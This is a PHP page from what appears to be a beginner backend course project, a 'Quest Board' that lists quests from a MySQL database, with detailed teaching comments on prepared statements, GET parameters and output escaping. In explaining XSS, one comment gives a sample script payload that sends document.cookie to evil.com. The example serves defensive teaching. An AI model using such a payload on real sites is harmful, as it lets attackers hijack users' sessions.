<?php
// =============================================================
//  index.php — The Quest Board Home Page
// =============================================================
//  This page does two things:
//    1. Connects to the database (via db.php)
//    2. Fetches all quests and displays them as cards
//
//  This is the R in CRUD — READ.
//
//  CONCEPT: This is a "server-rendered" page.
//  Unlike JavaScript (which runs in the browser), PHP runs on
//  the SERVER before the page is sent to the user. The browser
//  never sees any PHP code — it only receives plain HTML.
//
//  Flow:
//    1. User visits http://localhost/quest-board/
//    2. Apache (the web server) sees "there's a PHP file, let me run it"
//    3. PHP connects to MySQL, grabs the data, and builds HTML
//    4. Apache sends the finished HTML to the browser
//    5. The browser displays it (it has no idea PHP was involved!)
// =============================================================


// Step 1: Connect to the database.
// After this line, we have access to the $pdo variable from db.php.
// Remember: include literally pastes db.php's code right here.
include 'includes/db.php';

// Step 2: Write a SQL query to fetch all quests.
//
// SELECT * FROM quests  →  "Get every column from the quests table"
//   * means "all columns" (id, title, description, posted_by, etc.)
//
// ORDER BY created_at DESC  →  "Sort by date, newest first"
//   DESC = descending (newest → oldest)
//   ASC  = ascending  (oldest → newest) — the default if you leave it off
//
// WHY prepare() instead of just query()?
//   This particular query has no user input, so query() would actually
//   be safe here. But we use prepare() everywhere as a habit, because
//   when you DO have user input (like in post_quest.php), prepare()
//   prevents SQL injection attacks. Consistency = fewer mistakes.
$stmt = $pdo->prepare("SELECT * FROM quests ORDER BY created_at DESC");

// Step 3: Execute the query (actually run it against the database).
// prepare() sets up the query; execute() actually fires it.
$stmt->execute();

// Step 4: Fetch ALL the results as an array of rows.
// Each item in $quests is an associative array (like a dictionary):
//   $quests[0]['title']       => "Slay the Forest Troll"
//   $quests[0]['is_complete'] => 0
//   $quests[1]['title']       => "Deliver Medicine to the Village"
//
// fetchAll() gets EVERY row at once. If we only needed one row,
// we'd use fetch() instead.
$quests = $stmt->fetchAll();

// Step 5: Set the page title, then include the shared header.
// $pageTitle is used inside header.php for the <title> tag.
$pageTitle = 'Quest Board — All Quests';
include 'includes/header.php';
?>

<section class="page-hero">
    <h1>📜 Active Quests</h1>
    <p>Choose your quest wisely, adventurer. Glory awaits the bold.</p>
    <a href="pages/post_quest.php" class="btn btn-primary">✍️ Post a New Quest</a>
</section>

<?php
// Check if there are any quests at all.
// count() returns the number of items in an array.
// If count is 0, we show a friendly "empty state" message.
if (count($quests) === 0):
?>
    <!-- If there are no quests, show a friendly empty state -->
    <div class="empty-state">
        <p>🏚️ The board is empty. No quests have been posted yet.</p>
        <a href="pages/post_quest.php" class="btn btn-primary">Be the first to post one!</a>
    </div>

<?php else: ?>

    <!-- Loop through every quest and display it as a card -->
    <div class="quest-grid">
        <?php foreach ($quests as $quest): ?>

            <!--
                We add the CSS class 'is-complete' when is_complete === 1.
                This lets CSS visually grey out completed quests.

                HOW THIS WORKS:
                PHP's ternary operator (? :) is a shorthand if/else:
                    $quest['is_complete'] ? 'is-complete' : ''
                If the quest is complete → add the class 'is-complete'
                If not                  → add nothing (empty string '')

                Then in style.css, the rule:
                    .quest-card.is-complete { opacity: 0.55; }
                dims the card so it looks "done".
            -->
            <div class="quest-card <?php echo $quest['is_complete'] ? 'is-complete' : ''; ?>">

                <div class="quest-card-header">
                    <h2 class="quest-title">
                        <?php
                        // =================================================
                        //  htmlspecialchars() — WHAT IT IS AND WHY WE USE IT
                        // =================================================
                        //
                        //  WHAT: Converts special characters into safe HTML:
                        //    <  becomes  &lt;
                        //    >  becomes  &gt;
                        //    "  becomes  &quot;
                        //    &  becomes  &amp;
                        //
                        //  WHY: To prevent XSS (Cross-Site Scripting) attacks.
                        //
                        //  WHAT IS XSS?
                        //  XSS is when a hacker puts JavaScript code inside
                        //  a form field. If you print that input without
                        //  escaping it, the browser will RUN the JavaScript!
                        //
                        //  EXAMPLE ATTACK:
                        //  A hacker types this as their quest title:
                        //    <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
                        //
                        //  Without htmlspecialchars():
                        //    The browser sees a <script> tag and RUNS it!
                        //    The hacker could steal login sessions, redirect
                        //    users to fake sites, or deface the page.
                        //
                        //  With htmlspecialchars():
                        //    The browser sees: &lt;script&gt;...&lt;/script&gt;
                        //    It displays the text harmlessly instead of running it.
                        //
                        //  RULE: ALWAYS use htmlspecialchars() when printing
                        //        any data that came from a user. No exceptions.
                        echo htmlspecialchars($quest['title']);
                        ?>
                    </h2>

                    <?php if ($quest['is_complete']): ?>
                        <span class="badge badge-complete">✅ Complete</span>
                    <?php else: ?>
                        <span class="badge badge-open">🗡️ Open</span>
                    <?php endif; ?>
                </div>

                <p class="quest-description">
                    <?php echo htmlspecialchars($quest['description']); ?>
                </p>

                <div class="quest-meta">
                    <span>👤 Posted by: <strong><?php echo htmlspecialchars($quest['posted_by']); ?></strong></span>
                    <!--
                        date() formats a timestamp into a readable string.
                        'M j, Y' → "Mar 15, 2025"
                          M = 3-letter month name
                          j = day of the month (no leading zero)
                          Y = 4-digit year

                        strtotime() converts the database datetime string
                        (like "2025-03-15 14:30:00") into a number that
                        date() can understand.
                    -->
                    <span>🕐 <?php echo date('M j, Y', strtotime($quest['created_at'])); ?></span>
                </div>

                <!-- Action buttons -->
                <div class="quest-actions">

                    <?php if (!$quest['is_complete']): ?>
                        <!--
                            HOW LINKS PASS DATA — GET PARAMETERS:

                            This link goes to: complete_quest.php?id=3

                            The ?id=3 part is called a "query string" or
                            "GET parameter". It's data attached to the URL.

                            When complete_quest.php loads, it reads this
                            value with $_GET['id'], which would equal "3".

                            WHY use GET here instead of POST?
                            GET is for "I want to do/see something" — the
                            data is visible in the URL (good for links).
                            POST is for "I'm submitting form data" — the
                            data is hidden in the request body.

                            confirm() is a JavaScript function that shows
                            a popup asking "Are you sure?" before proceeding.
                            If the user clicks Cancel, the link is NOT followed.
                        -->
                        <a href="pages/complete_quest.php?id=<?php echo $quest['id']; ?>"
                           class="btn btn-success"
                           onclick="return confirm('Mark this quest as complete?')">
                            ✅ Mark Complete
                        </a>
                    <?php endif; ?>

                    <a href="pages/delete_quest.php?id=<?php echo $quest['id']; ?>"
                       class="btn btn-danger"
                       onclick="return confirm('Delete this quest permanently?')">
                        🗑️ Delete
                    </a>

                </div>
            </div>

        <?php endforeach; ?>
    </div>

<?php endif; ?>

</main>

<footer class="site-footer">
    <p>⚔️ Quest Board — iCode Orange Belt Backend Project</p>
</footer>

</body>
</html>
